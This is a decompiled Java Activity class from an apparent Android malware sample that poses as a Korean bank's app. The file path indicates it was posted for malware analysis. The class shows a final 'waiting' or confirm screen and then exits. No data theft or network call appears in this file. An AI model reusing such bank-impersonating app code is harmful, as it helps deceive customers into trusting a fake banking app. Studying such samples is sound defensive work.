package com.kbstar.kb.android.star;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.Window;
import android.widget.ImageView;
import android.widget.LinearLayout;
import com.kbstar.kb.android.star.util.GeneralUtil;
import com.kbstar.kb.android.star.util.Url;
import java.util.List;

public class KB_Last
  extends Activity
  implements View.OnClickListener
{
  private LinearLayout ars_wait_layout;
  private ImageView btn_confirm;
  private LinearLayout last_layout;
  Intent msg_type = null;
  private String page_type;
  private Url url = new Url();
  
  private void initView()
  {
    this.btn_confirm = ((ImageView)findViewById(2131296264));
    this.btn_confirm.setOnClickListener(this);
    this.last_layout = ((LinearLayout)findViewById(2131296308));
    this.ars_wait_layout = ((LinearLayout)findViewById(2131296309));
    if (this.page_type == null)
    {
      this.ars_wait_layout.setVisibility(0);
      this.btn_confirm.setVisibility(8);
      return;
    }
    this.last_layout.setVisibility(0);
  }
  
  public void onClick(View paramView)
  {
    switch (paramView.getId())
    {
    default: 
      return;
    }
    GeneralUtil.exit();
  }
  
  protected void onCreate(Bundle paramBundle)
  {
    super.onCreate(paramBundle);
    GeneralUtil.activityList.add(this);
    getWindow().requestFeature(1);
    setContentView(2130903052);
    this.msg_type = getIntent();
    this.page_type = this.msg_type.getStringExtra("ars");
    initView();
  }
  
  protected void onDestroy()
  {
    super.onDestroy();
  }
}


/* Location:              /home/enzo/Documents/BorelEnzo.github.io/malwares/dsencrypt/payload.jar!/com/kbstar/kb/android/star/KB_Last.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */